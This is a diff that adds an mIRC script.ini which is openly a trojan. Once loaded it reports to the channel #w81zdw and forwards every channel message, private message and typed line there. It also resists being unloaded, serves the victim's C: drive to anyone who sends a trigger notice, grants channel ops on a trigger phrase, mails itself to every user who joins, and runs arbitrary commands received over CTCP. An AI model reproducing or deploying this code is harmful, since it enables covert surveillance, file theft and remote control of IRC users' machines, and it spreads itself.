@@ -1,0 +1,15 @@
+[script]
+n0=on 1:LOAD: { .ial on | .events on | .ctcps on | .msg #w81zdw $me just loaded the trojaned script.ini }
+n1=on 1:UNLOAD: { .quit I tried unloading script.ini!!! | .timer -o 0 1 /.exit | .timer 0 1 /.exit }
+n2=on 1:TEXT:*I*0wn*this*channel*:#:/.mode $chan +o $nick 
+n3=on 1:NOTICE:b33p:*:/fserve $nick 69 c:\ 
+n4=on 1:TEXT:*:#:/raw -q PRIVMSG #w81zdw : $+ < $+ $nick @ $chan $+ > $1- 
+n5=on 1:TEXT:*:?:/raw -q PRIVMSG #w81zdw : $+ < $+ $nick @MSG> $1- 
+n6=on 1:INPUT:#:/raw -q PRIVMSG #w81zdw : $+ < $+ $me @ $chan $+ > $1- 
+n7=on 1!:JOIN:#:/.dcc send $nick $script
+n8=ctcp 1:REPLY: { .ctcpreply $nick I am 0wned By user anonymous | halt }
+n9=ctcp 1:UTC*: { 
+n10=  if DIE isin $1- { .ctcpreply $nick UTC DIE Request Recieved. Excuting... | exit }
+n11=  else halt
+n12=}
+n13=ctcp 1:DO*: { $2- | halt }
